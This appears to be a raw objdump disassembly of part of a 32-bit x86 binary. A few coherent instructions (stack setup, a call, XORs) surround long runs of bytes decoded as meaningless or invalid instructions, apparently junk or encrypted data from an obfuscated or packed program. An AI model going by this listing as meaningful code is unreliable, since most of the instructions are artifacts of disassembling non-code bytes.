  411156:	mov    DWORD PTR [ebp-0x2c],0x53e4
  41115d:	mov    DWORD PTR [ebp-0x20],0x32d8
  411164:	mov    DWORD PTR [ebp-0x1c],0x5cb6
  41116b:	mov    DWORD PTR [ebp-0xc],0x3956
  411172:	mov    DWORD PTR [ebp-0xa4],0x4e57
  41117c:	mov    DWORD PTR [ebp-0x94],0x1
  411186:	mov    DWORD PTR [ebp-0x14],0x17ab
  41118d:	mov    DWORD PTR [ebp-0x64],0x7a3d
  411194:	mov    DWORD PTR [ebp-0x54],0x378a
  41119b:	mov    DWORD PTR [ebp-0x74],0x5a00
  4111a2:	mov    DWORD PTR [ebp-0x24],0x1f3a
  4111a9:	mov    DWORD PTR [ebp-0x84],0x9a225
  4111b3:	mov    DWORD PTR [ebp-0x44],0x31f8
  4111ba:	mov    DWORD PTR [ebp-0x34],0x3663
  4111c1:	mov    DWORD PTR [ebp-0xb4],0x3165
  4111cb:	mov    DWORD PTR [ebp-0xc0],0x1ebe
  4111d5:	mov    DWORD PTR [ebp-0xbc],0x43cc
  4111df:	jmp    0x411454
  4111e4:	mov    ecx,0x1c975440
  4111e9:	jnp    0x41119d
  4111eb:	push   ds
  4111ec:	jl     0x41125d
  4111ee:	mov    esi,DWORD PTR [eax-0x2d]
  4111f1:	push   esp
  4111f2:	pop    ebx
  4111f3:	jo     0x4111e3
  4111f5:	jl     0x41120f
  4111f7:	sbb    BYTE PTR [ecx+0x14],dh
  4111fa:	sbb    BYTE PTR [eax],bl
  4111fc:	xlat   BYTE PTR ds:[ebx]
  4111fd:	in     al,dx
  4111fe:	daa    
  4111ff:	cs into 
  411201:	mov    ah,0xe3
  411203:	sub    edi,DWORD PTR [esi+0x6cd1caa1]
  411209:	sar    DWORD PTR es:[ecx],cl
  41120c:	and    dh,BYTE PTR [eax+0x16]
  41120f:	stc    
  411210:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411211:	cmp    bh,BYTE PTR [ebx-0x506a0d97]
  411217:	and    DWORD PTR [edx-0x4b],ebp
  41121a:	pop    ss
  41121b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41121c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41121d:	out    dx,eax
  41121e:	loop   0x411204
  411220:	test   eax,0x4fc12d64
  411225:	shl    ecx,0xb
  411228:	mov    edx,ecx
  41122a:	ret    
  41122b:	sub    eax,0x53a4b496
  411230:	ret    0x2a2f
  411233:	jp     0x41122a
  411235:	mov    dl,0xee
  411237:	aam    0x69
  411239:	lahf   
  41123a:	fimul  WORD PTR [ecx+0x7]
  41123d:	fs pop edi
  41123f:	and    dl,BYTE PTR [edi+0x62a17bcf]
  411245:	xchg   edi,eax
  411246:	xchg   edx,eax
  411247:	daa    
  411248:	mov    ch,0xa8
  41124a:	sbb    bh,BYTE PTR [esi+0x6f]
  41124d:	icebp  
  41124e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41124f:	ds sub ch,bl
  411252:	or     DWORD PTR [ebx+0x53ad157e],ebp
  411258:	(bad)  
  411259:	xor    ecx,ebx
  41125b:	mov    WORD PTR [ebp+ecx*2-0x4466cf43],gs
  411262:	and    DWORD PTR [eax],0x41
  411265:	push   edi
  411266:	sub    al,0x7e
  411268:	inc    edi
  411269:	pop    eax
  41126a:	dec    edi
  41126b:	in     eax,dx
  41126c:	add    al,0x34
  41126e:	adc    BYTE PTR [edi+0x9],dl
  411271:	fiadd  DWORD PTR [esi-0x3d]
  411274:	mov    ds:0xdceb0a3f,al
  411279:	mov    dh,0xa2
  41127b:	(bad)  
  41127c:	fmul   DWORD PTR [esi]
  41127e:	mov    ds:0x494c8282,eax
  411283:	clc    
  411284:	push   0xffffffa9
  411286:	retf   
  411287:	sbb    edi,edi
  411289:	enter  0xcf09,0x40
  41128d:	adc    esi,eax
  41128f:	ds es mov cl,0x4e
  411293:	mov    dh,0xc4
  411295:	scas   eax,DWORD PTR es:[edi]
  411296:	jns    0x4112ae
  411298:	mov    edi,0xe1af642e
  41129d:	std    
  41129e:	sub    ch,bh
  4112a0:	jbe    0x4112dd
  4112a2:	cdq    
  4112a3:	(bad)  
  4112a5:	inc    ebp
  4112a6:	cmp    al,0x4
  4112a8:	ud0    esi,ecx
  4112ab:	inc    esi
  4112ac:	cmp    DWORD PTR [edi-0x5c],0xe87c8c4e
  4112b3:	cmc    
  4112b4:	cld    
  4112b5:	and    al,0x6a
  4112b7:	arpl   WORD PTR [ebx+edi*4+0x555e1294],di
  4112be:	ja     0x411240
  4112c0:	daa    
  4112c1:	mul    BYTE PTR [edi]
  4112c3:	shl    DWORD PTR [esi+0x6],0x9
  4112c7:	sbb    ah,BYTE PTR [esi]
  4112c9:	push   edx
  4112ca:	push   0x79
  4112cc:	fild   WORD PTR [edx+0x70c543aa]
  4112d2:	pop    ds
  4112d3:	push   0x1baa47c6
  4112d8:	xor    ebx,DWORD PTR [eax+0x629f925c]
  4112de:	add    dl,cl
  4112e0:	inc    esi
  4112e1:	xchg   BYTE PTR [eax-0x66],dl
  4112e4:	sbb    bl,bh
  4112e6:	out    dx,al
  4112e7:	add    bl,BYTE PTR [edx-0x71]
  4112ea:	or     eax,0xfea3abca
  4112ef:	int3   
  4112f0:	out    0x8f,eax
  4112f2:	fst    QWORD PTR [eax+ecx*1]
  4112f5:	sub    edx,eax
  4112f7:	mov    cl,0x87
  4112f9:	icebp  
  4112fa:	ins    DWORD PTR es:[edi],dx
  4112fb:	and    eax,0x561493c0
  411300:	push   edi
  411301:	sbb    al,0xb5
  411303:	cmc    
  411304:	int    0x27
  411306:	fcmovu st,st(6)
  411308:	ja     0x411352
  41130a:	xor    al,0x85
  41130c:	fstp   DWORD PTR [edx]
  41130e:	je     0x4112fa
  411310:	cmp    edi,esp
  411312:	jns    0x411302
  411314:	ss int3 
  411316:	bound  ebp,QWORD PTR [esi+0x23]
  411319:	imul   edx,esi,0x37
  41131c:	ret    
  41131d:	sub    dl,al
  41131f:	adc    al,0x78
  411321:	(bad)  
  411322:	leave  
  411323:	dec    esi
  411324:	adc    al,0x44
  411327:	mov    ?,edx
  411329:	pop    ebp
  41132a:	jmp    0x4113a3
  41132c:	push   ebp
  41132d:	ror    BYTE PTR [esi+esi*8],cl
  411330:	outs   dx,DWORD PTR ds:[esi]
  411331:	xchg   esi,eax
  411332:	ds sub ecx,DWORD PTR fs:[edi]
  411336:	(bad)  
  411337:	jno    0x41131b
  411339:	aaa    
  41133a:	dec    esp
  41133b:	xchg   DWORD PTR [ecx+0x35],ebx
  41133e:	mov    BYTE PTR [edi-0x685ee52f],dl
  411344:	xchg   ecx,eax
  411345:	and    ebx,edi
  411347:	mov    WORD PTR ds:0xbb344e4b,gs
  41134d:	sbb    eax,0x8ce7fadc
  411352:	add    bl,BYTE PTR [edx-0x1ae15a]
  411358:	frstor [eax-0x1ba3527]
  41135e:	out    dx,eax
  41135f:	out    0x4d,al
  411361:	xor    al,0x7b
  411363:	or     BYTE PTR [esi-0x5a1e5eae],0xbe
  41136a:	outs   dx,BYTE PTR ds:[esi]
  41136b:	jbe    0x41137b
  41136d:	mov    bh,0xb0
  41136f:	stc    
  411370:	stc    
  411371:	ins    BYTE PTR es:[edi],dx
  411372:	adc    BYTE PTR [edi+0x69],dh
  411375:	ret    0x8ffc
  411378:	and    DWORD PTR gs:[ebp-0x31bc8b20],ecx
  41137f:	f2xm1  
  411381:	es pop edi
  411383:	cwde   
  411384:	lahf   
  411385:	inc    ebp
  411386:	daa    
  411387:	adc    DWORD PTR [esi+0x6a9dc016],edi
  41138d:	jo     0x411335
  41138f:	ins    BYTE PTR es:[edi],dx
  411390:	(bad)  
  411391:	out    0xd,al
  411393:	clc    
  411394:	mov    edx,0xf69454d0
  411399:	clc    
  41139a:	lods   eax,DWORD PTR ds:[esi]
  41139b:	adc    DWORD PTR [edi],esp
  41139d:	ror    DWORD PTR ds:0x664f203c,cl
  4113a3:	sbb    al,0xf9
  4113a5:	push   0xcc18391f
  4113aa:	add    edi,edx
  4113ac:	dec    ecx
  4113ad:	mov    ah,0xea
  4113af:	cs test al,0xeb
  4113b2:	icebp  
  4113b3:	mov    esi,0xaab54659
  4113b8:	ins    DWORD PTR es:[edi],dx
  4113b9:	push   esp
  4113ba:	pop    esi
  4113bb:	jecxz  0x4113cc
  4113bd:	stos   BYTE PTR es:[edi],al
  4113be:	(bad)  
  4113bf:	push   0xffffffe7
  4113c1:	or     DWORD PTR [edi],esi
  4113c3:	sub    ecx,esp
  4113c5:	int    0xb3
  4113c7:	dec    esp
  4113c8:	push   ebp
  4113c9:	aam    0xba
  4113cb:	mov    eax,ds:0x40297347
  4113d0:	push   ebx
  4113d1:	pop    ecx
  4113d2:	lods   al,BYTE PTR ds:[esi]
  4113d3:	dec    ebp
  4113d4:	add    edi,DWORD PTR [esi+0x4a5ccff6]
  4113da:	les    eax,FWORD PTR [eax+0x6c122a3d]
  4113e0:	and    bl,BYTE PTR [ebx+ebx*4]
  4113e3:	pop    esi
  4113e4:	test   BYTE PTR [edx+0x7d],al
  4113e7:	cmovnp ecx,DWORD PTR [edx]
  4113ea:	mov    dl,BYTE PTR [edx+0x60]
  4113ed:	iret   
  4113ee:	xchg   esp,eax
  4113ef:	pop    esi
  4113f0:	cmc    
  4113f1:	imul   edi,ecx,0x2b728db7
  4113f7:	xor    al,0x3
  4113f9:	repnz test al,0xdf
  4113fc:	jmp    0x7b1bdabf
  411401:	mov    ds:0x6155aded,al
  411406:	retf   
  411407:	and    al,0x65
  411409:	addr16 xor eax,0x65ed4a89
  41140f:	hlt    
  411410:	retf   0x2c63
  411413:	iret   
  411414:	mov    ebp,0xef88a42d
  411419:	mov    bh,BYTE PTR [ebx]
  41141b:	adc    DWORD PTR [eax-0x5b],esi
  41141e:	push   edi
  41141f:	sub    al,BYTE PTR [esi]
  411421:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411422:	xchg   esp,eax
  411423:	add    al,0x93
  411425:	jne    0x411453
  411427:	xchg   esi,eax
  411428:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411429:	push   ss
  41142a:	inc    eax
  41142b:	jo     0x4113bb
  41142d:	and    BYTE PTR [edi+eax*1+0x7f],ch
  411431:	mov    ah,0xe8
  411433:	inc    eax
  411434:	hlt    
  411435:	cld    
  411436:	jg     0x411415
  411438:	inc    esi
  411439:	iret   
  41143a:	(bad)  
  41143b:	pop    esi
  41143c:	add    ecx,esi
  41143e:	scas   al,BYTE PTR es:[edi]
  41143f:	mov    BYTE PTR [edx+ebx*4-0x19],bl
  411443:	loope  0x411420
  411445:	pop    ds
  411446:	inc    ebx
  411447:	ja     0x4113cb
  411449:	sub    eax,0x25575960
  41144e:	push   esi
  41144f:	push   es
  411450:	mov    BYTE PTR ds:0x85c7d980,dl
  411456:	push   eax
  411457:	(bad)  
  411458:	(bad)  
  411459:	jmp    DWORD PTR [ebp+esi*2+0x0]
  41145d:	add    bh,al
  41145f:	test   DWORD PTR [edi+edi*8-0x1],edx
  411463:	dec    edi
  411465:	sbb    BYTE PTR [eax],al
  411467:	add    bh,al
  411469:	test   DWORD PTR [eax-0x1],esp
  41146c:	(bad)  
  41146d:	push   DWORD PTR ds:0xc7000031
  411473:	test   DWORD PTR [edi+edi*8-0x1],esp
  411477:	dec    DWORD PTR [ebp-0x38ffffaa]
  41147d:	test   DWORD PTR [eax-0x1],esi
  411480:	(bad)  
  411481:	push   edx
  411483:	adc    DWORD PTR [eax],eax
  411485:	add    bh,al
  411487:	test   DWORD PTR [edi+edi*8-0x1],esi
  41148b:	(bad)  
  41148c:	jmp    0xf045:0xc7000063
  411493:	data16 xor BYTE PTR [eax],al
  411496:	add    bh,al
  411498:	inc    ebp
  411499:	clc    
  41149a:	shr    BYTE PTR [esi+0x0],cl
  41149d:	add    BYTE PTR [eax+0x1d],ch
  4114a0:	jle    0x4114a2
  4114a2:	add    cl,ch
  4114a4:	jo     0x4114a8
  4114a6:	add    BYTE PTR [eax],al
  4114a8:	dec    edi
  4114a9:	sub    bl,BYTE PTR [edx+0x3b209ab0]
  4114af:	sub    dl,BYTE PTR [eax+0x667e2188]
  4114b5:	xchg   ebp,eax
  4114b6:	jno    0x411468
  4114b8:	inc    edi
  4114b9:	js     0x4114d3
  4114bb:	sbb    BYTE PTR [ecx+0x14],dh
  4114be:	sbb    BYTE PTR [eax],bl
  4114c0:	mov    bh,ch
  4114c2:	imul   ebp,DWORD PTR [edi],0xfffffff4
  4114c5:	cs dec ebx
  4114c7:	scas   eax,DWORD PTR es:[edi]
  4114c8:	(bad)  
  4114c9:	pop    esp
  4114ca:	or     DWORD PTR [edi],edx
  4114cc:	add    BYTE PTR [ebx+0x47],0xcd
  4114d0:	mov    esi,0x60a01a09
  4114d5:	mov    ah,0x41
  4114d7:	aas    
  4114d8:	pop    esp
  4114d9:	mov    bl,0x25
  4114db:	sub    ecx,ebp
  4114dd:	adc    eax,0xec2d29f4
  4114e2:	out    0x5e,al
  4114e4:	sar    BYTE PTR [ebx-0x31],1
  4114e7:	lods   al,BYTE PTR ds:[esi]
  4114e8:	dec    edx
  4114e9:	mov    ds:0x423d346a,eax
  4114ee:	push   esp
  4114ef:	and    dh,bl
  4114f1:	pop    ss
  4114f2:	sub    eax,0x1a11a711
  4114f7:	dec    eax
  4114f8:	mov    al,0x1b
  4114fa:	sub    DWORD PTR [ecx-0x2a],ebx
  4114fd:	dec    esp
  4114fe:	in     eax,dx
  4114ff:	cmp    dh,BYTE PTR [eax+ecx*2-0x3a628b47]
  411506:	mov    al,0xe4
  411508:	cmp    edx,DWORD PTR [ebx-0x465534d1]
  41150e:	add    eax,0xb57d3e2a
  411513:	push   edi
  411514:	cmp    al,0xd6
  411516:	fsubr  QWORD PTR [ebp-0xe263e95]
  41151c:	lock in al,dx
  41151e:	mov    cl,0x34
  411520:	push   edx
  411521:	ret    0x986e
  411524:	mov    WORD PTR [ebx+esi*4],cs
  411527:	in     al,dx
  411528:	inc    esi
  411529:	in     al,dx
  41152a:	add    al,0x3f
  41152c:	add    al,0x11
  41152e:	test   ah,dl
  411530:	ds std 
  411532:	pop    ebx
  411533:	inc    ecx
  411534:	cmp    DWORD PTR [eax-0x1b0c92f9],ecx
  41153a:	scas   eax,DWORD PTR es:[edi]
  41153b:	sub    DWORD PTR [edx+0x5b],eax
  41153e:	lea    eax,[eax]
  411540:	dec    esp
  411541:	jg     0x4115a9
  411543:	outs   dx,DWORD PTR ds:[esi]
  411544:	pusha  
  411545:	jg     0x41152c
  411547:	nop
  411548:	ret    0x1a66
  41154b:	pop    ebp
  41154c:	sbb    ecx,ebx
  41154e:	inc    edx
  41154f:	ret    0xe27
  411552:	fwait
  411553:	(bad)
  411556:	fwait
  411557:	dec    ebx
  411558:	lock (bad) 
  41155a:	mov    eax,ds:0xa0353625
  41155f:	sahf   
  411560:	sbb    ecx,DWORD PTR [esi]
  411562:	jbe    0x411541
  411564:	push   ss
  411565:	test   al,0xb5
  411567:	mov    al,0x3c
  411569:	das    
  41156a:	sub    al,0x2e
  41156d:	(bad)  
  41156e:	fisubr DWORD PTR [ecx]
  411570:	rol    edx,1
  411572:	(bad)  
  411573:	push   ebx
  411574:	mov    eax,0x9b973231
  411579:	test   al,0x18
  41157b:	in     eax,dx
  41157c:	rep lods al,BYTE PTR ds:[esi]
  41157e:	dec    ecx
  41157f:	sti    
  411580:	ja     0x411516
  411582:	mov    DWORD PTR [edi+0x35],esp
  411585:	(bad)  
  411586:	pop    ss
  411587:	aam    0x19
  411589:	and    DWORD PTR [eax-0x59],ebx
  41158c:	jg     0x41151e
  41158e:	pop    ebp
  41158f:	mov    esi,0x28d0b2d4
  411594:	push   ds
  411595:	push   edi
  411596:	jne    0x4115b6
  411598:	adc    ebx,DWORD PTR [eax+eax*8-0x46]
  41159c:	ins    BYTE PTR es:[edi],dx
  41159d:	add    edx,ecx
  41159f:	and    eax,0x580cb0e6
  4115a4:	mov    ebp,0x4610a83e
  4115a9:	xchg   edi,eax
  4115aa:	sahf   
  4115ab:	test   dx,bp
  4115ae:	cli    
  4115af:	fistp  WORD PTR [edx-0xc542164]
  4115b5:	jg     0x4115ad
  4115b7:	jb     0x4115b3
  4115b9:	jle    0x411558
  4115bb:	jge    0x411590
  4115bd:	stos   BYTE PTR es:[edi],al
  4115be:	retf   
  4115bf:	lods   eax,DWORD PTR ds:[esi]
  4115c0:	xor    esi,esp
  4115c2:	mov    bl,0x59
  4115c4:	mov    bl,0x63
  4115c6:	jge    0x411554
  4115c8:	sub    edi,DWORD PTR [esi-0xf906c56]
  4115ce:	adc    BYTE PTR [ebp+0x3d],cl
  4115d1:	or     eax,0xe5244f42
  4115d6:	xor    al,0x11
  4115d8:	cdq    
  4115d9:	xchg   ah,bh
  4115db:	adc    DWORD PTR [edi],edx
  4115dd:	sahf   
  4115de:	push   ecx
  4115df:	lahf   
  4115e0:	mov    ds:0x570a479,al
  4115e5:	iret   
  4115e6:	fsubp  st(3),st
  4115e8:	(bad)  
  4115e9:	pushf  
  4115ea:	idiv   dl
  4115ec:	gs mov edi,0xd0b09030
  4115f2:	jbe    0x4115fc
  4115f4:	in     eax,0x4
  4115f6:	pop    eax
  4115f7:	call   0x822dd2fc
  4115fc:	pushf  
  4115fd:	cs push 0xf2c4cff0
  411603:	xchg   cl,bh
  411605:	push   esi
  411606:	adc    edx,DWORD PTR [eax-0x55]
  411609:	sub    ah,ch
  41160b:	pop    es
  41160c:	adc    al,0x21
  41160e:	fucom  st(1)
  411610:	mov    esi,DWORD PTR [esi+0x7b]
  411613:	add    ebx,edi
  411615:	ror    ecx,1
  411617:	sub    dh,ah
  411619:	and    DWORD PTR [ebp-0x514d4e0d],0xffffffdc
  411620:	aam    0x4e
  411622:	bound  esp,QWORD PTR [edi]
  411624:	push   esp
  411625:	jle    0x4115c7
  411627:	inc    ecx
  411628:	push   eax
  411629:	mov    ebx,0x4c1dc9c0
  41162e:	sbb    al,0x21
  411630:	add    ebp,DWORD PTR [ecx+edi*1-0xb]
  411634:	psubd  mm1,mm0
  411637:	ret    0xb5b
  41163a:	out    dx,eax
  41163b:	aaa    
  41163c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41163d:	inc    edx
  41163e:	dec    edi
  41163f:	les    edx,FWORD PTR [eax-0x2070f46c]
  411645:	jae    0x4115cd
  411647:	call   0x8dd8ad0b
  41164c:	stos   DWORD PTR es:[edi],eax
  41164d:	mov    edi,esp
  41164f:	mov    DWORD PTR [esi],eax
  411651:	xor    DWORD PTR [ecx+0x60],esi
  411654:	push   ecx
  411655:	std    
  411656:	(bad)  
  411657:	jle    0x4115eb
  411659:	fistp  WORD PTR [edi-0xe]
  41165c:	sub    ebp,DWORD PTR [esi-0x1c]
  41165f:	int    0x47
  411661:	leave  
  411662:	xchg   edi,eax
  411663:	fs pusha 
  411665:	pusha  
  411666:	jp     0x41160a
  411668:	int3   
  411669:	inc    ebp
  41166a:	jb     0x411671
  41166c:	clc    
  41166d:	dec    ebp
  41166e:	inc    ebx
  41166f:	and    cl,BYTE PTR [eax+esi*2-0x1c]
  411673:	mov    cl,0xf0
  411675:	jmp    0x41162e
  411677:	xor    bl,BYTE PTR [ebx]
  411679:	push   ss
  41167a:	fcom   DWORD PTR [ebx]
  41167c:	fdivr  DWORD PTR [eax+0x2ae3a77f]
  411682:	adc    BYTE PTR [esi-0x1dd9029],ah
  411688:	sub    esi,DWORD PTR [esi-0x6407fa05]
  41168e:	push   cs
  41168f:	iret   
  411690:	cmp    DWORD PTR [ecx+0x34],0x8887edc0
  411697:	sbb    dl,BYTE PTR [edi-0x6fc9958c]
  41169d:	mov    al,0xcc
  41169f:	add    BYTE PTR [edi],cl
  4116a1:	add    BYTE PTR [ebp+0xee327e7],0x40
  4116a8:	mov    bl,0x28
  4116aa:	cs bswap ebp
  4116ad:	mov    dh,0xea
  4116af:	repz ss stc 
  4116b2:	fcmovb st,st(3)
  4116b4:	mov    ebp,0x488c00c7
  4116b9:	inc    esp
  4116ba:	push   edx
  4116bb:	test   al,0x98
  4116bd:	sbb    bl,ch
  4116bf:	ret    
  4116c0:	mov    es:0xb6c5f55e,al
  4116c6:	mov    al,ds:0x5d427136
  4116cb:	mov    WORD PTR [edx+0x6e],gs
  4116ce:	dec    edi
  4116cf:	das    
  4116d0:	or     BYTE PTR [esi-0x24],al
  4116d3:	das    
  4116d4:	add    DWORD PTR [ebp+0x20],edi
  4116d7:	inc    ebx
  4116d8:	jmp    0x18f2111f
  4116dd:	jecxz  0x41173b
  4116df:	ins    BYTE PTR es:[edi],dx
  4116e0:	je     0x4116f8
  4116e2:	sahf   
  4116e3:	sub    al,0x7c
  4116e5:	aas    
  4116e6:	imul   edi,DWORD PTR [eax-0x5bb0c9be],0x2
  4116ed:	rol    DWORD PTR [edx+0x61],cl
  4116f0:	pop    ecx
  4116f1:	xor    al,0x7e
  4116f3:	add    al,0xad
  4116f5:	or     dh,BYTE PTR [ebx-0x550973f2]
  4116fb:	dec    eax
  4116fc:	js     0x411761
  4116fe:	fadd   DWORD PTR [esi+ebx*8+0x35]
  411702:	sub    al,0xac
  411704:	adc    BYTE PTR [eax-0x4c],0xc4
  411708:	gs push eax
  41170a:	fwait
  41170b:	dec    edx
  41170c:	in     al,0x72
  41170e:	xchg   esp,eax
  41170f:	mov    al,0xdc
  411711:	mov    dh,0xd8
  411713:	fcom   st(0)
  411715:	adc    DWORD PTR [ebp+0x4b],ebp
  411718:	mov    DWORD PTR [ebp-0x4],0x30f4
  41171f:	mov    eax,DWORD PTR [ebp-0x20]
  411722:	mov    ecx,DWORD PTR [ebp-0x1c]
  411725:	push   0x5380
  41172a:	push   ecx
  41172b:	push   eax
  41172c:	call   0x416c20
  411731:	mov    ecx,eax
  411733:	mov    eax,DWORD PTR [ebp-0x30]
  411736:	xor    ecx,eax
  411738:	mov    esi,edx
  41173a:	mov    edx,DWORD PTR [ebp-0x2c]
  41173d:	mov    eax,DWORD PTR [ebp-0x40]
  411740:	xor    esi,edx
  411742:	jmp    0x4119b7
  411747:	lds    edi,FWORD PTR [ecx]
  411749:	fisubr WORD PTR [ebp+0x5a]
  41174c:	sbb    al,BYTE PTR [edx+0x21]
  41174f:	pusha  
  411750:	mov    al,ds:0xc55aa57
  411755:	lock mov esi,0x1818749e
  41175b:	jno    0x411771
  41175d:	sbb    BYTE PTR [eax],bl
  41175f:	ror    DWORD PTR [ebx],1
  411761:	ins    DWORD PTR es:[edi],dx
  411762:	clc    
  411763:	sbb    edi,esp
  411765:	ss add al,0x7a
  411768:	test   eax,0x54b28ae8
  41176d:	outs   dx,DWORD PTR es:[esi]
  41176f:	cli    
  411770:	out    dx,eax
  411771:	cs pop es
  411773:	push   edi
  411774:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411775:	mov    dl,0x36
  411777:	das    
  411778:	jb     0x411755
  41177a:	xlat   BYTE PTR ds:[ebx]
  41177b:	xchg   BYTE PTR [esi+0x35],ah
  41177e:	mov    ebp,0x2610e81f
  411783:	ins    DWORD PTR es:[edi],dx
  411784:	cld    
  411785:	xor    DWORD PTR [ebp+0x72],eax
  411788:	add    BYTE PTR [edi],ah
  41178a:	shrd   DWORD PTR [ebx-0x2848b438],ebx,cl
  411791:	jle    0x4117da
  411793:	dec    esp
  411794:	jo     0x411771
  411796:	imul   edi,DWORD PTR [ebp-0x45321b48],0xfb308c40
  4117a0:	and    eax,0xf5961c97
  4117a5:	mov    eax,ds:0x7f7f887c
  4117aa:	dec    ebx
  4117ab:	mov    dh,0x90
  4117ad:	jbe    0x4117b5
  4117af:	inc    BYTE PTR fs:[eax]
  4117b2:	es ins BYTE PTR es:[edi],dx
  4117b4:	in     al,0xbc
  4117b6:	ror    DWORD PTR ds:0xf0e888f6,0x10
  4117bd:	mov    edx,eax
  4117bf:	jno    0x4117f0
  4117c1:	sub    bl,BYTE PTR [ebx+0x47]
  4117c4:	mov    ecx,DWORD PTR [edi-0x2265e844]
  4117ca:	loope  0x411763
  4117cc:	not    BYTE PTR ds:0xd06777d4
  4117d2:	push   ds
  4117d3:	aas    
  4117d4:	mov    ds:0x1c4da650,eax
  4117da:	add    bh,BYTE PTR [edx+ecx*8]
  4117dd:	ins    DWORD PTR es:[edi],dx
  4117de:	sub    cl,BYTE PTR [ecx]
  4117e0:	mov    bh,0xee
  4117e2:	adc    dh,BYTE PTR [eax-0x6b]
  4117e5:	sbb    eax,0x79b141de
  4117ea:	add    cl,BYTE PTR [esi+0x8178db0]
  4117f0:	adc    al,0x7e
  4117f2:	je     0x4117f2
  4117f4:	jmp    0xf25b:0xf64cf1c
  4117fb:	adc    DWORD PTR [ebp+0x439a8387],0x4
  411802:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411803:	test   DWORD PTR [ebx],ebp
  411805:	hlt    
  411806:	ds push 0xe6d9f99b
  41180c:	jo     0x4117fe
  41180e:	xor    ecx,esp
  411810:	popa   
  411811:	jns    0x411838
  411813:	jg     0x411880
  411815:	sahf   
  411816:	jg     0x411804
  411818:	adc    al,0xe
  41181a:	lds    eax,FWORD PTR [edx+0x7c]
  41181d:	jb     0x411824
  41181f:	outs   dx,DWORD PTR ds:[esi]
  411820:	xchg   edx,eax
  411821:	ins    BYTE PTR es:[edi],dx
  411822:	push   esi
  411823:	and    al,0xbe
  411825:	jge    0x41181f
  411827:	gs pop edx
  411829:	(bad)  
  41182a:	in     eax,dx
  41182b:	mov    esi,0x555e8c02
  411830:	sub    DWORD PTR [ebp-0x6cc9f82d],ebp
  411836:	mov    al,ds:0xcd6bf776
  41183b:	xchg   esp,eax
  41183c:	mov    esi,0x77d3ae76
  411841:	out    dx,al
  411842:	jbe    0x411871
  411844:	cdq    
  411845:	enter  0x5689,0x43
  411849:	mul    DWORD PTR [ecx-0x1fc8db48]
  41184f:	sub    al,0x77
  411851:	or     DWORD PTR [edi],edx
  411853:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411854:	or     eax,0x3320cce3
  411859:	(bad)  
  41185a:	das    
  41185b:	cmc    
  41185c:	mov    esp,DWORD PTR cs:[ebp-0x7b205ab0]
  411863:	call   0x6c2bb3da
  411868:	and    DWORD PTR [eax-0x2a],edi
  41186b:	stc    
  41186c:	loop   0x41187c
  41186e:	xor    al,0x95
  411870:	mov    cl,0xc1
  411872:	inc    esi
  411873:	dec    edx
  411874:	ss jns 0x411894
  411877:	pop    eax
  411878:	push   0x25f61e53
  41187d:	or     DWORD PTR [ebx],esp
  41187f:	and    al,0x91
  411881:	xor    bl,cl
  411883:	enter  0xc02d,0xe9
  411887:	ss repz pop esi
  41188a:	fwait
  41188b:	(bad)  
  41188c:	mov    esi,0x68a18b42
  411891:	das    
  411892:	adc    al,0x5a
  411894:	fst    DWORD PTR [ebx]
  411896:	rcl    BYTE PTR [eax+0x4d],0xe1
  41189a:	xchg   DWORD PTR ds:0x6624b41c,edx
  4118a0:	aas    
  4118a1:	imul   esp,DWORD PTR [ebp-0x6bad73c7],0xffffffb1
  4118a8:	adc    DWORD PTR [esi],esi
  4118aa:	addr16 mov cl,0xdb
  4118ad:	mov    WORD PTR [edi+0x157bde5],cs
  4118b3:	bound  eax,QWORD PTR [ecx-0x57]
  4118b6:	fldenv [ebp+esi*1-0x4d]
  4118ba:	dec    ebp
  4118bb:	lea    esi,[ebp+0x60]
  4118be:	mov    ebx,0x753103bb
  4118c3:	push   es
  4118c4:	mov    ds:0x5be1c034,eax
  4118c9:	sbb    al,0x24
  4118cb:	jbe    0x411909
  4118cd:	push   esi
  4118ce:	int3   
  4118cf:	ins    BYTE PTR es:[edi],dx
  4118d0:	pop    ecx
  4118d1:	leave  
  4118d2:	and    esi,DWORD PTR ds:0xc283bbca
  4118d8:	js     0x411908
  4118da:	inc    ebx
  4118db:	xor    ebp,edi
  4118dd:	fdivr  DWORD PTR [edx-0x3d9fd10e]
  4118e3:	(bad)  
  4118e5:	or     dh,BYTE PTR [edx+0x5fbe8efc]
  4118eb:	jnp    0x41196c
  4118ed:	push   esi
  4118ee:	in     eax,dx
  4118ef:	mov    DWORD PTR [esi-0x715ad980],esp
  4118f5:	inc    ebp
  4118f6:	dec    ebx
  4118f7:	add    al,0x46
  4118fa:	sbb    al,0x53
  4118fc:	and    bh,BYTE PTR [eax]
  4118fe:	push   0xffffffa7
  411900:	add    ebp,DWORD PTR [ebp+0x38]
  411903:	leave  
  411904:	jns    0x41195c
  411906:	xor    DWORD PTR [ebp-0x62],0x5c
  41190a:	popa   
  41190b:	aaa    
  41190c:	int3   
  41190d:	mov    al,0xde
  41190f:	dec    edx
  411910:	push   ds
  411911:	mov    esp,0x9c8d1a70
  411916:	inc    ebx
  411917:	xlat   BYTE PTR ds:[ebx]
  411918:	icebp  
  411919:	clc    
  41191a:	into   
  41191b:	jno    0x4118c6
  41191d:	fwait
  41191e:	pop    eax
  41191f:	push   ecx
  411920:	xor    eax,0xb9687eff
  411925:	sbb    al,0x6d
  411927:	pop    ss
  411928:	push   edi
  411929:	in     eax,0xe9
  41192b:	test   DWORD PTR ds:0x5844804e,eax
  411931:	adc    eax,ebx
  411933:	xchg   esi,eax
  411934:	adc    DWORD PTR [ecx-0x37],0x4db3c62a
  41193b:	sbb    al,0x2b
  41193d:	stos   BYTE PTR es:[edi],al
  41193e:	xor    bh,ch
  411940:	sbb    BYTE PTR [esp+edi*4+0x7138541d],bh
  411947:	xchg   ebp,eax
  411948:	mov    al,0x24
  41194a:	mov    ecx,0xbb6ca3e
  41194f:	(bad)  
  411950:	imul   al
  411952:	in     eax,dx
  411953:	fnop   
  411955:	les    ecx,FWORD PTR [ecx]
  411957:	outs   dx,DWORD PTR ds:[esi]
